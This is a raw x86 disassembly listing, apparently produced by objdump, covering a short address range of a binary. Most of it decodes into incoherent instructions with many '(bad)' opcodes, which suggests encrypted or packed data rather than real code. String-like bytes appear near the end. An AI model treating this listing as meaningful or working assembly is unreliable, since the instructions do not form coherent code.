  423f6a:	dec    ebp
  423f6b:	stc    
  423f6c:	aad    0x89
  423f6e:	or     DWORD PTR [ecx],eax
  423f70:	mov    edx,0xa3b9cd4a
  423f75:	pusha  
  423f76:	adc    ch,BYTE PTR [ebx]
  423f78:	das    
  423f79:	lods   eax,DWORD PTR gs:[esi]
  423f7b:	sub    al,0xb7
  423f7d:	fs fstp st(1)
  423f80:	pop    es
  423f81:	(bad)  
  423f82:	mov    cl,ch
  423f84:	int3   
  423f85:	adc    ecx,ebx
  423f87:	or     al,0xc3
  423f89:	enter  0xa78f,0x48
  423f8d:	call   0x47a6:0x1feb0e07
  423f94:	mov    bl,0xdd
  423f96:	pop    edx
  423f97:	aas    
  423f98:	popa   
  423f99:	repz dec ebp
  423f9b:	sbb    DWORD PTR [esp+ebp*1],esp
  423f9e:	lock lea eax,[esi-0x7b]
  423fa2:	inc    esp
  423fa3:	xor    dh,BYTE PTR [esi-0x7f]
  423fa6:	and    eax,0x4e029e5d
  423fab:	mov    bl,0xb2
  423fad:	xchg   esi,eax
  423fae:	aas    
  423faf:	cmp    dh,BYTE PTR [edi]
  423fb1:	loope  0x423f4e
  423fb3:	inc    edi
  423fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fb5:	dec    eax
  423fb6:	fstp   QWORD PTR [edi+0x5ef4435e]
  423fbc:	out    dx,al
  423fbd:	mov    al,0xd1
  423fbf:	sub    BYTE PTR [ecx-0x15],0x8e
  423fc3:	mov    ebx,0xe36e582c
  423fc8:	pop    ecx
  423fc9:	adc    ch,BYTE PTR [ebx]
  423fcb:	rcl    BYTE PTR [edx+0x20c0f9a8],0x3d
  423fd2:	ds cld 
  423fd4:	xchg   ebp,eax
  423fd5:	enter  0xff98,0x88
  423fd9:	inc    esp
  423fda:	scas   eax,DWORD PTR es:[edi]
  423fdb:	or     ebp,DWORD PTR [ecx+0x4e]
  423fde:	xchg   ecx,eax
  423fdf:	add    al,0x8a
  423fe1:	cmp    ax,0x93d4
  423fe5:	push   ecx
  423fe7:	and    al,0x3a
  423fe9:	push   ecx
  423fea:	add    cl,bh
  423fec:	sbb    al,al
  423fee:	inc    esi
  423fef:	jecxz  0x423fcf
  423ff1:	(bad)  
  423ff2:	mov    edi,0xe1f1bc83
  423ff7:	mov    bh,0x8
  423ff9:	sub    esp,ebp
  423ffb:	fwait
  423ffc:	call   0x2294002
  424001:	add    BYTE PTR [eax],al
  424003:	loopne 0x423fbf
  424005:	mov    al,ds:0xaf1ff0f1
  42400a:	ror    DWORD PTR [esi+0x7c],cl
  42400d:	xchg   edx,eax
  42400e:	ret    
  42400f:	dec    edx
  424010:	mov    DWORD PTR [eax-0x7c],edx
  424013:	ret    0xa5e7
  424016:	or     eax,0xd7a2a62e
  42401b:	add    DWORD PTR [ecx-0x2d],edi
  42401e:	xor    bh,BYTE PTR [edi+0x24]
  424021:	push   ss
  424022:	pop    edi
  424023:	or     eax,0x33e27507
  424028:	cmp    DWORD PTR [esp+eax*2-0x1c],eax
  42402c:	in     eax,0xbc
  42402e:	sar    DWORD PTR [edx],cl
  424030:	out    dx,al
  424031:	mov    eax,ds:0x56bdd152
  424036:	out    0xd,al
  424038:	lods   al,BYTE PTR ds:[esi]
  424039:	mov    eax,0xb2604597
  42403e:	jl     0x423ff7
  424040:	and    esp,DWORD PTR [ecx+0x42b88cdc]
  424046:	mov    esi,ds
  424048:	mov    ds:0xdd7df83e,al
  42404d:	add    BYTE PTR [ebp-0xf1f49e1],bh
  424053:	lea    eax,[edx]
  424055:	inc    edx
  424056:	clc    
  424057:	jl     0x423fe7
  424059:	leave  
  42405a:	xchg   ch,dh
  42405c:	and    DWORD PTR [ebx+0x10],ebx
  42405f:	xchg   esp,eax
  424060:	popf   
  424061:	stc    
  424062:	jg     0x42402a
  424064:	fldcw  WORD PTR [eax]
  424066:	aaa    
  424067:	inc    edi
  424068:	cs dec eax
  42406a:	xchg   BYTE PTR [ebx-0x7a],bh
  42406d:	fs xchg edx,eax
  42406f:	nop
  424070:	mov    BYTE PTR [eax+edx*1],ch
  424073:	xor    DWORD PTR ds:0x4e75f73c,edi
  424079:	jg     0x4240ed
  42407b:	in     al,0x4
  42407d:	mov    dh,BYTE PTR [eax+0x72523901]
  424083:	pop    eax
  424084:	jne    0x4240a2
  424086:	sar    DWORD PTR [eax-0x35],cl
  424089:	pop    edi
  42408a:	lods   eax,DWORD PTR ds:[esi]
  42408b:	into   
  42408c:	or     esp,ebp
  42408e:	mov    ah,0xb7
  424090:	pop    ecx
  424091:	cmp    ah,al
  424093:	lahf   
  424094:	cld    
  424095:	(bad)  
  424096:	sub    al,0xec
  424098:	jl     0x4240cf
  42409a:	pop    esi
  42409b:	loopne 0x42401f
  42409d:	dec    ebx
  42409e:	pop    ebp
  42409f:	jg     0x4240bd
  4240a1:	outs   dx,DWORD PTR ds:[esi]
  4240a2:	jl     0x424044
  4240a4:	cwde   
  4240a5:	retf   0xd7d2
  4240a8:	and    al,0x93
  4240aa:	jns    0x424125
  4240ac:	dec    eax
  4240ad:	ins    DWORD PTR es:[edi],dx
  4240ae:	inc    ecx
  4240af:	ss (bad) 
  4240b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240b3:	xor    ah,bl
  4240b5:	pop    ebp
  4240b6:	sti    
  4240b7:	mov    al,ds:0xc825ff1f
  4240bc:	mov    ss,WORD PTR [ebp-0x2533f9b1]
  4240c2:	push   edi
  4240c3:	sub    BYTE PTR [esi+ebp*2],0x5
  4240c7:	das    
  4240c8:	repz and ah,cl
  4240cb:	adc    DWORD PTR [ebx+0x73],ebx
  4240ce:	and    BYTE PTR [edx+esi*1-0x1942d20a],ch
  4240d5:	lods   al,BYTE PTR ds:[esi]
  4240d6:	lock push esp
  4240d8:	imul   edi,edi,0x1a8bc4dd
  4240de:	popa   
  4240df:	jae    0x4240b8
  4240e1:	lods   eax,DWORD PTR ds:[esi]
  4240e2:	sub    al,0x7e
  4240e4:	call   0x955f:0xa40e0d85
  4240eb:	test   DWORD PTR [ebx-0x61148c2d],esi
  4240f1:	stos   DWORD PTR es:[edi],eax
  4240f2:	neg    WORD PTR [ecx]
  4240f5:	nop
  4240f6:	xor    al,0xe1
  4240f8:	xchg   esi,eax
  4240f9:	sbb    edx,esi
  4240fb:	loop   0x4240c9
  4240fd:	(bad)  
  4240fe:	in     al,dx
  4240ff:	push   esp
  424100:	(bad)  
  424101:	xor    eax,0xf3cac3ad
  424106:	retf   
  424107:	mov    eax,0x826e23af
  42410c:	gs mov ch,0x30
  42410f:	dec    edi
  424110:	int3   
  424111:	mov    esi,0xf353bced
  424116:	sbb    DWORD PTR [edi],esp
  424118:	dec    esi
  424119:	cmp    DWORD PTR ds:0x98143596,ebx
  42411f:	lods   eax,DWORD PTR ds:[esi]
  424120:	sbb    al,0x4b
  424122:	push   cs
  424123:	sbb    BYTE PTR [ebp-0x148bcb63],ch
  424129:	imul   DWORD PTR [esi+eax*2+0xc]
  42412d:	pop    esp
  42412e:	push   es
  42412f:	mov    dh,0xba
  424131:	dec    esi
  424132:	mov    cs,WORD PTR [ebx]
  424134:	addr16 in al,dx
  424136:	(bad)  
  424137:	fbstp  TBYTE PTR [ebp+0x77]
  42413a:	imul   ebx,DWORD PTR [ebp+0x408dd56b],0xffffffe7
  424141:	in     eax,dx
  424142:	sub    BYTE PTR [ebx+0x64c621],dl
  424148:	fwait
  424149:	test   dh,0xf
  42414c:	(bad)  
  42414d:	aam    0x10
  42414f:	mov    ebx,0x8a6e6fc4
  424154:	out    dx,eax
  424155:	jo     0x4240f4
  424157:	into   
  424158:	jb     0x4240f7
  42415a:	dec    eax
  42415b:	xor    BYTE PTR [edi+edi*8-0x31c0cb2b],dl
  424162:	test   eax,0xddefeb46
  424167:	pop    ss
  424168:	or     eax,DWORD PTR [ebx+eax*4-0x2d]
  42416c:	xor    eax,0x1e465682
  424171:	in     eax,dx
  424172:	mov    bl,0x6a
  424174:	inc    ebp
  424175:	inc    ebp
  424176:	aad    0xe0
  424178:	mov    dh,0xbc
  42417a:	or     al,0x14
  42417c:	or     ah,0x3b
  42417f:	push   ebx
  424180:	ret    0xcc12
  424183:	loopne 0x42417b
  424185:	mov    ah,0xab
  424187:	repnz xor ch,BYTE PTR [edx]
  42418a:	mov    bl,0x95
  42418c:	mov    ds:0x2b63a1b7,eax
  424191:	add    DWORD PTR [ecx],eax
  424193:	imul   ebx,DWORD PTR [ecx-0x17],0x35
  424197:	mov    ebx,0xf6166356
  42419c:	push   edi
  42419d:	out    dx,al
  42419e:	in     eax,0x77
  4241a0:	lock in eax,dx
  4241a2:	xchg   ecx,eax
  4241a3:	in     al,0x71
  4241a5:	fldenv [ebp+0x14]
  4241a8:	jl     0x4241cd
  4241aa:	fs cwde 
  4241ac:	pop    DWORD PTR [ebp+ebx*1+0x771f0689]
  4241b3:	ret    0x2858
  4241b6:	fucomp st(7)
  4241b8:	cwde   
  4241b9:	stos   DWORD PTR es:[edi],eax
  4241ba:	fmul   st(5),st
  4241bc:	aam    0x60
  4241be:	dec    esp
  4241bf:	mov    ebx,0xc3468068
  4241c4:	call   0xdeab:0xdf35fd07
  4241cb:	dec    eax
  4241cc:	mov    cl,0x99
  4241ce:	push   0xffffffa1
  4241d0:	js     0x42420f
  4241d2:	cmp    BYTE PTR [ebx-0x37],ch
  4241d5:	scas   eax,DWORD PTR es:[edi]
  4241d6:	jp     0x424249
  4241d8:	pop    esi
  4241d9:	jae    0x424173
  4241db:	out    dx,al
  4241dc:	fld    QWORD PTR [ebp+edi*8-0x1d42fb35]
  4241e3:	inc    eax
  4241e4:	xchg   ebx,eax
  4241e5:	xchg   ebp,eax
  4241e6:	ror    DWORD PTR [esi-0x5eff61df],1
  4241ec:	mov    ecx,0x8f3e8336
  4241f1:	mov    ch,0xbb
  4241f3:	icebp  
  4241f4:	and    eax,0xa4b18c27
  4241f9:	jp     0x42424c
  4241fb:	sub    dl,0x1
  4241fe:	add    bh,ah
  424200:	add    DWORD PTR [eax],eax
  424202:	add    al,dh
  424204:	std    
  424205:	dec    eax
  424206:	repnz xchg ecx,eax
  424208:	mov    ds:0x9396cf76,eax
  42420d:	out    0xa7,al
  42420f:	xchg   ebx,eax
  424210:	mov    dl,0xa8
  424212:	test   eax,0xc1b173cd
  424217:	sub    bl,ah
  424219:	fwait
  42421a:	cmp    al,0x96
  42421c:	ficom  DWORD PTR cs:[esi-0x4b68bf75]
  424223:	xor    eax,0xc317e718
  424228:	xor    dh,BYTE PTR [ecx+0x53]
  42422b:	dec    edi
  42422c:	inc    eax
  42422d:	xlat   BYTE PTR ds:[ebx]
  42422e:	aad    0xbf
  424230:	(bad)  [esi-0x59]
  424233:	mov    bl,0x62
  424235:	push   ss
  424236:	fdivr  DWORD PTR [edx+0x16f081b7]
  42423c:	into   
  42423d:	jmp    DWORD PTR [edi+ebx*8-0x5387d220]
  424244:	adc    edi,DWORD PTR [ebx]
  424246:	into   
  424247:	adc    bh,BYTE PTR [eax-0x55]
  42424a:	test   DWORD PTR [ecx-0x19],ebx
  42424d:	jnp    0x42420c
  42424f:	jecxz  0x42420d
  424251:	imul   edi,DWORD PTR [ebx+0x11dc4ac0],0xa
  424258:	inc    edx
  424259:	div    BYTE PTR [ecx-0x7a367d0f]
  42425f:	addr16 stc 
  424261:	pop    edi
  424262:	mov    ch,0xa6
  424264:	xor    DWORD PTR [esi],esp
  424266:	push   ebp
  424267:	shl    BYTE PTR [edi-0x5c3ff71f],1
  42426d:	sub    ebp,DWORD PTR [eax]
  42426f:	adc    al,0x3
  424271:	jne    0x424232
  424273:	mov    WORD PTR [esi+esi*8-0x4d],cs
  424277:	add    BYTE PTR [edi],dh
  424279:	popa   
  42427a:	or     BYTE PTR cs:[ecx],ah
  42427d:	mov    edi,0x2a12f642
  424282:	sbb    dh,BYTE PTR [ebp+0x5a]
  424285:	jbe    0x4242e0
  424287:	icebp  
  424288:	xchg   ecx,eax
  424289:	add    DWORD PTR [esi+0x1d540336],0x35894e90
  424293:	xlat   BYTE PTR ds:[ebx]
  424294:	icebp  
  424295:	push   ds
  424296:	cmc    
  424297:	nop
  424298:	cdq    
  424299:	adc    al,0x37
  42429b:	ret    0x8d7a
  42429e:	cld    
  42429f:	adc    DWORD PTR [eax+0x2a],edi
  4242a2:	repnz push edx
  4242a4:	add    BYTE PTR [edi-0x8],dl
  4242a7:	sub    eax,0x8d19f93e
  4242ac:	(bad)  
  4242ae:	loop   0x42424a
  4242b0:	sahf   
  4242b1:	add    BYTE PTR [ebx+0x37],dl
  4242b4:	mov    al,0x68
  4242b6:	sahf   
  4242b7:	jg     0x424332
  4242b9:	fs jo  0x4242d8
  4242bc:	mov    gs,WORD PTR [edx]
  4242be:	iret   
  4242bf:	xchg   ebx,eax
  4242c0:	sbb    ch,BYTE PTR [ebp+0x1e9d61a8]
  4242c6:	xor    ecx,edi
  4242c8:	imul   esp,ecx,0xffffffb5
  4242cb:	mov    ebx,0xb92a1bd8
  4242d0:	inc    esi
  4242d1:	mov    bl,BYTE PTR ds:0x7c230da3
  4242d7:	out    dx,eax
  4242d8:	adc    eax,0x1d811e55
  4242dd:	adc    BYTE PTR [edi+edx*4],dh
  4242e0:	mov    ds:0x4ba3e01b,al
  4242e5:	data16 jle 0x42433c
  4242e8:	mov    WORD PTR [eax+esi*8-0x6aa29c33],gs
  4242ef:	mov    edi,DWORD PTR [eax-0x56af8cd]
  4242f5:	rol    dh,1
  4242f7:	cmp    bl,ch
  4242f9:	inc    eax
  4242fa:	icebp  
  4242fb:	(bad)  
  4242fc:	sub    ebp,DWORD PTR [ebx]
  4242fe:	popf   
  4242ff:	repnz xor eax,0x92347eb3
  424305:	sahf   
  424306:	stos   DWORD PTR es:[edi],eax
  424307:	adc    BYTE PTR [ecx],dl
  424309:	inc    eax
  42430a:	dec    edi
  42430b:	cmp    ch,al
  42430d:	cwde   
  42430e:	push   edx
  42430f:	push   es
  424310:	ss push ecx
  424312:	jmp    0x34549da0
  424317:	mov    eax,ds:0xf949ac1f
  42431c:	(bad)  
  42431d:	fadd   st(2),st
  42431f:	popa   
  424320:	sbb    BYTE PTR [ebx+edi*4],dl
  424323:	jecxz  0x4243a4
  424325:	ja     0x424305
  424327:	xor    BYTE PTR [ebp+0x64a6a326],ch
  42432d:	pop    edx
  42432e:	dec    edi
  42432f:	jo     0x4242f8
  424331:	pop    eax
  424332:	in     al,dx
  424333:	dec    esi
  424334:	sahf   
  424335:	xchg   edi,eax
  424336:	jmp    0x3233:0xda236ca8
  42433d:	rcr    bl,1
  42433f:	mov    ch,0xa0
  424341:	pop    ecx
  424342:	xor    eax,0x113cc5ea
  424347:	int3   
  424348:	inc    ebx
  424349:	cld    
  42434a:	xor    ah,BYTE PTR [ebp-0x15]
  42434d:	push   ecx
  42434e:	out    dx,al
  42434f:	mov    ah,0x5c
  424351:	cmp    eax,0xe0765758
  424356:	push   0xc0b11703
  42435b:	retf   0x1f40
  42435e:	inc    ebx
  42435f:	inc    edx
  424360:	outs   dx,BYTE PTR ds:[esi]
  424361:	ror    DWORD PTR [ebp+eax*8+0x7e],1
  424365:	adc    bl,BYTE PTR [eax+0x41]
  424368:	push   es
  424369:	cmc    
  42436a:	ret    
  42436b:	ja     0x42435f
  42436d:	mov    BYTE PTR [ebx],dl
  42436f:	and    DWORD PTR [esi],ebx
  424371:	fstp   TBYTE PTR [eax]
  424373:	mov    WORD PTR [ebx+0x17],ds
  424376:	xchg   BYTE PTR [ecx+0x6c22b795],dh
  42437c:	mov    ds:0x97ab5daf,al
  424381:	jnp    0x424335
  424383:	dec    eax
  424384:	and    esp,DWORD PTR [ecx]
  424386:	add    al,0xcf
  424388:	mov    eax,ds:0x1a755e16
  42438d:	pushf  
  42438e:	test   eax,0x7fca0825
  424393:	iret   
  424394:	lods   al,BYTE PTR ds:[esi]
  424395:	jno    0x4243ff
  424397:	aas    
  424398:	dec    edi
  424399:	inc    ebp
  42439a:	rol    eax,1
  42439c:	cli    
  42439d:	js     0xf26ae0
  4243a3:	out    0xf1,al
  4243a5:	dec    ebx
  4243a6:	jg     0x424377
  4243a8:	sbb    DWORD PTR ds:0x8ba841c3,0x99373331
  4243b2:	inc    esi
  4243b3:	add    al,0x72
  4243b5:	cmp    ebp,DWORD PTR [ebp+0xa]
  4243b8:	push   ecx
  4243b9:	sub    cl,dh
  4243bb:	cmp    ch,dl
  4243bd:	sub    eax,0xdc8fd54f
  4243c2:	mov    bh,0xfa
  4243c4:	cdq    
  4243c5:	xlat   BYTE PTR ds:[ebx]
  4243c6:	pop    eax
  4243c7:	adc    al,0x8e
  4243c9:	jae    0x42434f
  4243cb:	xchg   ebp,eax
  4243cc:	outs   dx,DWORD PTR ds:[esi]
  4243cd:	jl     0x424417
  4243cf:	add    DWORD PTR [ecx+edx*1+0xc],0x74
  4243d4:	xor    BYTE PTR [ebx],al
  4243d6:	and    esi,DWORD PTR [edi]
  4243d8:	ds push 0xe6c6e6dd
  4243de:	adc    edx,esp
  4243e0:	mov    ah,0x80
  4243e2:	hlt    
  4243e3:	js     0x4243ff
  4243e5:	cmp    edx,DWORD PTR [edi+0x8aabd3]
  4243eb:	adc    dl,bh
  4243ed:	repz or esi,edi
  4243f0:	das    
  4243f1:	cli    
  4243f2:	fist   WORD PTR [ecx]
  4243f4:	dec    ebx
  4243f5:	es nop
  4243f7:	pop    ebx
  4243f8:	scas   al,BYTE PTR es:[edi]
  4243f9:	push   edi
  4243fa:	(bad)
  4243fe:	add    bh,ah
  424400:	add    DWORD PTR [eax],eax
  424402:	add    BYTE PTR [ecx+eax*8],ch
  424405:	pop    edi
  424406:	and    ebx,0x3958ead2
  42440c:	loopne 0x4243b6
  42440e:	sbb    al,0x9f
  424410:	sub    DWORD PTR [edx+edx*2],edi
  424413:	sbb    bl,BYTE PTR [edi+0x4bf9e158]
  424419:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42441a:	fild   DWORD PTR [eax-0x73]
  42441d:	and    DWORD PTR [ebp+0x63c72d8a],0x541c01d4
  424427:	jmp    0x71d5:0xababa1
  42442e:	xchg   DWORD PTR [edx+0x7e],edi
  424431:	popf   
  424432:	inc    edx
  424433:	jle    0x4243cb
  424435:	and    DWORD PTR [edx+0x16],edx
  424438:	out    dx,al
  424439:	dec    ebx
  42443a:	cmp    ch,ah
  42443c:	lock ins BYTE PTR es:[edi],dx
  42443e:	imul   edi,DWORD PTR [esp+ebx*4-0x5],0xffffff87
  424443:	jge    0x424441
  424445:	dec    edi
  424446:	mov    edx,0x67ab3771
  42444b:	jge    0x42446e
  42444d:	daa    
  42444e:	dec    ebp
  42444f:	xchg   edx,eax
  424451:	repnz xor dh,BYTE PTR [eax]
  424454:	into   
  424455:	or     al,0xd2
  424457:	and    ebp,eax
  424459:	xchg   ecx,eax
  42445a:	int3   
  42445b:	push   es
  42445c:	fnstcw WORD PTR [eax+0x2714b3d2]
  424462:	in     eax,0x8
  424464:	jge    0x4243f7
  424466:	aam    0xd
  424468:	dec    edi
  424469:	pop    ecx
  42446a:	outs   dx,DWORD PTR ds:[esi]
  42446b:	mov    al,0xf
  42446d:	icebp  
  42446e:	inc    esi
  42446f:	pop    ss
  424470:	push   es
  424471:	add    eax,0x39fa6e8a
  424476:	(bad)  
  424478:	sar    DWORD PTR [ecx],1
  42447a:	jne    0x424427
  42447c:	sub    al,0xee
  42447e:	inc    eax
  42447f:	cmp    dh,0x60
  424482:	mov    cl,0x14
  424484:	sub    al,0xe6
  424486:	ret    0xfa4f
  424489:	mov    bl,BYTE PTR [esi+0x56]
  42448c:	cli    
  42448d:	sub    esp,DWORD PTR [esi+0x20afe449]
  424493:	sub    bl,BYTE PTR [ebx-0x7c89b804]
  424499:	push   ss
  42449a:	xor    edx,esp
  42449c:	std    
  42449d:	mov    ds:0x23a51956,eax
  4244a2:	jge    0x424426
  4244a4:	mov    esp,0x2b811625
  4244a9:	cwde   
  4244aa:	inc    ebp
  4244ab:	sub    esp,DWORD PTR [edx+0x61]
  4244ae:	mov    ss,WORD PTR [edx-0x587ef364]
  4244b4:	inc    esi
  4244b5:	cli    
  4244b6:	sbb    al,0xb3
  4244b8:	in     eax,dx
  4244b9:	jg     0x42449a
  4244bb:	scas   eax,DWORD PTR es:[edi]
  4244bc:	mov    eax,ds:0xba73a782
  4244c1:	sbb    BYTE PTR [eax+0x3b],al
  4244c4:	xor    bh,BYTE PTR [edi-0x53c19d6b]
  4244ca:	push   ebx
  4244cb:	xchg   DWORD PTR [edx-0x1d9adb65],ecx
  4244d1:	ins    BYTE PTR es:[edi],dx
  4244d2:	ret    0xe00d
  4244d5:	fucomip st,st(3)
  4244d7:	gs sbb edi,0x4c
  4244db:	repnz loopne 0x42446b
  4244de:	(bad)  
  4244df:	retf   0x8cbd
  4244e2:	aas    
  4244e3:	adc    DWORD PTR [ebx],0x46eb7ee6
  4244e9:	std    
  4244ea:	retw   0x4c7a
  4244ee:	jae    0x4244a1
  4244f0:	jo     0x424504
  4244f2:	cmp    ebp,eax
  4244f4:	mov    gs,edi
  4244f6:	ins    BYTE PTR es:[edi],dx
  4244f7:	cmp    DWORD PTR [esi+0x21],eax
  4244fa:	(bad)  
  4244fb:	pop    esi
  4244fc:	adc    eax,DWORD PTR [ebx+ecx*1-0x3c72ed14]
  424503:	sub    ch,al
  424505:	mov    al,ch
  424507:	rcr    DWORD PTR [esi],0x59
  42450a:	cli    
  42450b:	mov    ebp,0xd35a9c7f
  424510:	je     0x424551
  424512:	push   ebx
  424513:	test   BYTE PTR [edx-0x54c05af3],dl
  424519:	loop   0x42451c
  42451b:	jecxz  0x4244b4
  42451d:	inc    edx
  42451e:	or     eax,0xd514b720
  424523:	(bad)  
  424524:	pop    sp
  424526:	cmovg  edi,edi
  424529:	adc    BYTE PTR [ecx+0x37],dh
  42452c:	call   0x53a32ba2
  424531:	loop   0x42453f
  424533:	(bad)  
  424535:	mov    ch,0xa6
  424537:	aaa    
  424538:	cmp    bl,BYTE PTR [ebx+0x19617f3a]
  42453e:	test   BYTE PTR es:[ebp+edx*8-0xe98b3],bl
  424546:	mov    ebx,DWORD PTR [eax]
  424548:	ja     0x424570
  42454a:	push   cs
  42454b:	push   edi
  42454c:	je     0x424599
  42454e:	add    BYTE PTR [edi+0x3fd80723],al
  424554:	mov    bh,al
  424556:	daa    
  424557:	lods   al,BYTE PTR ds:[esi]
  424558:	(bad)  
  424559:	cdq    
  42455a:	xor    ah,BYTE PTR [esi-0x8ccdaee]
  424560:	arpl   WORD PTR [ebx],bp
  424562:	cmp    DWORD PTR [ecx-0x6e3f3908],0xffffffaf
  424569:	xlat   BYTE PTR ds:[ebx]
  42456a:	sub    BYTE PTR [edx+0x62],ah
  42456d:	xchg   edx,eax
  42456e:	jns    0x424531
  424570:	fwait
  424571:	push   es
  424572:	(bad)  
  424574:	daa    
  424575:	arpl   bx,bx
  424577:	fmul   DWORD PTR [ecx]
  424579:	in     al,dx
  42457a:	pop    edx
  42457b:	adc    BYTE PTR [esi-0x4f],dl
  42457e:	jle    0x42455e
  424580:	iret   
  424581:	mov    ecx,0xa6691a88
  424586:	ins    BYTE PTR es:[edi],dx
  424587:	mov    dh,0x49
  424589:	lea    ebx,[edx-0x50a56b5e]
  42458f:	out    dx,eax
  424590:	mov    bh,0x27
  424592:	inc    ebx
  424593:	and    bl,BYTE PTR [ebx+0x4f]
  424596:	mov    BYTE PTR [ebx],al
  424598:	mov    ebx,0x26782eac
  42459d:	test   cl,bl
  42459f:	or     BYTE PTR [ecx],bh
  4245a1:	jle    0x4245ac
  4245a3:	(bad)  
  4245a4:	cmp    eax,0xaf7def62
  4245a9:	je     0x4245b3
  4245ab:	pop    edx
  4245ac:	add    BYTE PTR [esi+0x2aebd312],dl
  4245b2:	mov    ah,0x13
  4245b4:	jmp    0xbf10d14e
  4245b9:	fsubrp st(7),st
  4245bb:	xchg   esp,eax
  4245bc:	leave  
  4245bd:	(bad)  
  4245be:	sbb    eax,0x688d42eb
  4245c3:	jecxz  0x424563
  4245c5:	mov    edi,0x26324713
  4245ca:	iret   
  4245cb:	retf   
  4245cc:	arpl   bp,ax
  4245ce:	jecxz  0x42461a
  4245d0:	sbb    BYTE PTR [esi-0x25],bh
  4245d3:	aaa    
  4245d4:	in     eax,dx
  4245d5:	push   ebx
  4245d6:	sub    ecx,DWORD PTR [ebp+0x72eb0bef]
  4245dc:	mov    edi,0x279029a6
  4245e1:	mov    al,ds:0x5c680a36
  4245e6:	aam    0x30
  4245e8:	adc    al,0xd6
  4245ea:	add    BYTE PTR [eax],al
  4245ec:	xor    BYTE PTR [ebx+0x0],al
  4245ef:	add    al,0x30
  4245f1:	inc    ebx
  4245f2:	add    BYTE PTR [eax],cl
  4245f4:	xor    BYTE PTR [ebx+0x0],al
  4245f7:	or     al,0x30
  4245f9:	inc    ebx
  4245fa:	add    BYTE PTR [eax],dl
  4245fc:	xor    BYTE PTR [ebx+0x0],al
  4245ff:	adc    al,0x30
  424601:	inc    ebx
  424602:	add    BYTE PTR [eax],bl
  424604:	xor    BYTE PTR [ebx+0x0],al
  424607:	sbb    al,0x30
  424609:	inc    ebx
  42460a:	add    BYTE PTR [esi+0x49],cl
  42460d:	dec    esi
  42460e:	pop    edi
  42460f:	pop    edx
  424610:	dec    edx
  424611:	inc    ecx
  424612:	xor    eax,DWORD PTR [eax]
  424614:	push   ebx
  424615:	push   edi
  424616:	inc    edi
  424617:	cmp    DWORD PTR [edi+0x41],ebx
  42461a:	pop    eax
  42461b:	ss push esi
  42461d:	pop    ecx
  42461e:	add    BYTE PTR [ebx+0x43],dl
  424621:	inc    ebp
  424622:	pop    edi
  424623:	inc    ecx
  424624:	pop    eax
  424625:	push   edi
  424626:	dec    eax
  424627:	inc    edx
  424628:	pop    edi
  424629:	cmp    DWORD PTR [ecx+0x4d],ecx
  42462c:	dec    ecx
  42462d:	add    BYTE PTR [ecx+0x46],al
  424630:	cmp    DWORD PTR [edx],esi
  424632:	xor    ebx,DWORD PTR [edi+0x32]
  424635:	aaa    
  424636:	inc    esp
  424637:	inc    esp
  424638:	pop    edi
  424639:	xor    eax,0x41545800
  42463e:	pop    edi
  42463f:	push   ecx
  424640:	push   esp
  424641:	inc    esi
  424642:	push   ebp
  424643:	cmp    DWORD PTR [eax],eax
  424645:	push   edi
  424646:	push   ebp
  424647:	inc    ecx
  424648:	xor    dh,BYTE PTR [ebx]
  42464a:	xor    ebx,DWORD PTR [edi+0x4e]
  42464d:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  424651:	cmp    DWORD PTR [edi+0x38],ebx
  424654:	dec    ecx
  424655:	cmp    DWORD PTR [edx+0x36],ebx
  424658:	pop    edi
  424659:	dec    edx
  42465a:	xor    BYTE PTR [edx+0x34],cl
  42465d:	add    BYTE PTR [ecx+eax*2+0x34],cl
  424661:	xor    esi,DWORD PTR [eax]
  424663:	pop    edi
  424664:	inc    edx
  424665:	dec    ebx
  424666:	pop    eax
  424667:	pop    eax
  424668:	xor    eax,0x51414d00
  42466d:	pop    edi
  42466e:	inc    ecx
  42466f:	xor    al,BYTE PTR [ebp+0x5f]
  424672:	inc    ecx
  424673:	dec    ebx
  424674:	cmp    DWORD PTR ds:0x5a003939,esi
  42467a:	inc    ebp
  42467b:	cmp    BYTE PTR [edi+0x4d],bl
  42467e:	ss dec eax
  424680:	dec    ebx
  424681:	add    BYTE PTR [ebp+0x57],al
  424684:	xor    DWORD PTR [edi+0x31],ebx
  424687:	dec    ebx
  424688:	xor    eax,DWORD PTR [ecx+0x30]
  42468b:	push   ebx
  42468c:	add    BYTE PTR [edx+esi*1+0x36],al
  424690:	aaa    
  424691:	pop    edi
  424692:	push   edx
  424693:	dec    eax
  424694:	dec    ebp
  424695:	cmp    BYTE PTR [edi+0x37],bl
  424698:	inc    esi
  424699:	xor    eax,0x35005500
  42469e:	add    BYTE PTR [ebx+0x0],al
  4246a1:	pop    edi
  4246a2:	add    BYTE PTR [ecx+0x0],bl
  4246a5:	dec    ecx
  4246a6:	add    BYTE PTR [ebx+0x0],dl
  4246a9:	xor    al,BYTE PTR [eax]
  4246ab:	pop    edi
  4246ac:	add    BYTE PTR [edx+0x0],dl
  4246af:	add    BYTE PTR [eax],al
  4246b1:	push   eax
  4246b2:	add    BYTE PTR [ebp+0x0],dl
  4246b5:	dec    ecx
  4246b6:	add    BYTE PTR [eax],dh
  4246b8:	add    BYTE PTR [edi+0x0],bl
  4246bb:	inc    ebx
  4246bc:	add    BYTE PTR [esi],dh
  4246be:	add    BYTE PTR [ebp+0x0],al
  4246c1:	xor    al,BYTE PTR [eax]
  4246c3:	pop    edi
  4246c4:	add    BYTE PTR [ebp+0x0],cl
  4246c7:	xor    al,0x0
  4246c9:	dec    edx
  4246ca:	add    BYTE PTR [edx+0x0],dl
  4246cd:	push   ebp
  4246ce:	add    BYTE PTR [eax],al
  4246d0:	add    BYTE PTR [esi+0x0],cl
  4246d3:	cmp    DWORD PTR [eax],eax
  4246d5:	push   eax
  4246d6:	add    BYTE PTR [edi+0x0],bl
  4246d9:	push   ebp
  4246da:	add    BYTE PTR [ecx],bh
  4246dc:	add    BYTE PTR [esi],dh
  4246de:	add    BYTE PTR [eax],dh
  4246e0:	add    BYTE PTR [ecx],dh
  4246e2:	add    BYTE PTR [edi+0x0],bl
  4246e5:	dec    edi
  4246e6:	add    BYTE PTR [esi+0x0],cl
  4246e9:	push   esp
  4246ea:	add    BYTE PTR [eax],bh
  4246ec:	add    BYTE PTR [eax],al
  4246ee:	add    BYTE PTR [eax+eax*1+0x34],cl
  4246f2:	add    BYTE PTR [eax+eax*1+0x31],al
  4246f6:	add    BYTE PTR [edi+0x0],bl
